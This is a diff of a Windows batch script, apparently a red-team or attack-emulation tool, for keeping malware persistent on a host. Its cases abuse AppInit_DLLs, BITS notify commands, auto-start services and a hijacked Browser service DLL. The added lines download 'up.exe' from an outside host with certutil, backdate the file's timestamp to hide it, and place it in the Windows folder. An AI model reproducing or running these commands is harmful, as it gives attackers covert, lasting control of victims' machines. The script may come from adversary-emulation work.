@@ -1,4 +1,4 @@
-@echo off
+rem @echo off
 
 2>NUL CALL :CASE_%1
 IF ERRORLEVEL 1 CALL :DEFAULT
@@ -24,18 +24,23 @@ move /y updll32.dll c:\windows\syswow64
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "updll32.dll" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
-CALL :DEFAULT
+GOTO DEFAULT
 
 :CASE_bitsadmin
 SET SERVICENAME=blark
 REM bitsadmin persistance
+mkdir c:\temp
+cd \temp
+certutil.exe -urlcache -split -f "http://10.5.9.9:9983/up.exe" up.exe
+touch -t 201308220431 -- c:\temp\up.exe
+move up.exe c:\windows\
 bitsadmin /rawreturn /reset
 bitsadmin /rawreturn /create %SERVICENAME%
 bitsadmin /rawreturn /addfile %SERVICENAME% c:\windows\system32\user32.dll c:\users\public\documents\user32.gif
-bitsadmin /rawreturn /setnotifycmdline TEST c:\temp\bad1111.exe NULL
+bitsadmin /rawreturn /setnotifycmdline TEST c:\windows\up.exe NULL
 bitsadmin /rawreturn /setpriority %SERVICENAME% high
 bitsadmin /rawreturn /resume %SERVICENAME%
-CALL :DEFAULT
+GOTO DEFAULT
 
 :CASE_service
 REM service persistence
@@ -45,9 +50,10 @@ sc delete %SERVICENAME%
 sc create %SERVICENAME% binpath= c:\temp\bad2222.exe error= ignore start= auto DisplayName= blark
 sc description %SERVICENAME% %SERVICEDESC%
 sc start %SERVICENAME%
-CALL :DEFAULT
+GOTO DEFAULT
 
 :CASE_servicedll
+sc stop Browser
 mkdir c:\temp
 cd \temp
 certutil.exe -urlcache -split -f "http://10.5.9.9:9983/touch.exe" touch.exe
@@ -61,7 +67,7 @@ reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Trigger
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v DependOnService /f
 sc config Browser start= auto
 sc start Browser
-CALL :DEFAULT
+GOTO DEFAULT
 
 :DEFAULT
 REM self destruct
